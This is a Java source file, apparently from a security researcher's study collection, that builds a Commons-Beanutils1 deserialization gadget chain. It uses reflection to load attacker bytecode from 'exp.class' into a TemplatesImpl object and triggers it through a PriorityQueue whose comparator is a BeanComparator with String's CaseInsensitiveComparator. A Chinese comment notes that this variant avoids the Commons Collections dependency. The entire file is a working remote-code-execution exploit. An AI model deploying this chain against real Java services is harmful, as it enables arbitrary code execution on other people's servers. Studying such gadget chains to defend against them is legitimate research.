import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

import static util.Util.serialize;
import static util.Util.unserialize;

/*
* 注意：跟ComparableComparator那条是一样的，只是在BeanComparator初始化时候使用ReverseComparator或者CaseInsensitiveComparator
* 这样不需要依赖于CC的依赖，只需要有CB就行
* */


public class CommonBeanutils1_ReverseComparator {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        PriorityQueue priorityQueue=new PriorityQueue(2);
        priorityQueue.add("1");
        priorityQueue.add("2");
        Field field=PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);
        Object[] objects = (Object[]) field.get(priorityQueue);
        objects[0] = templates;

        //Class c = Class.forName("java.util.Collections$ReverseComparator");
        Class c = Class.forName("java.lang.String$CaseInsensitiveComparator");
        Constructor constructor=c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Comparator comparator= (Comparator) constructor.newInstance();


        BeanComparator beanComparator=new BeanComparator("outputProperties",comparator);
        Field field1 =Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field1.setAccessible(true);
        field1.set(priorityQueue,beanComparator);
        serialize(priorityQueue);
        unserialize();
    }
}
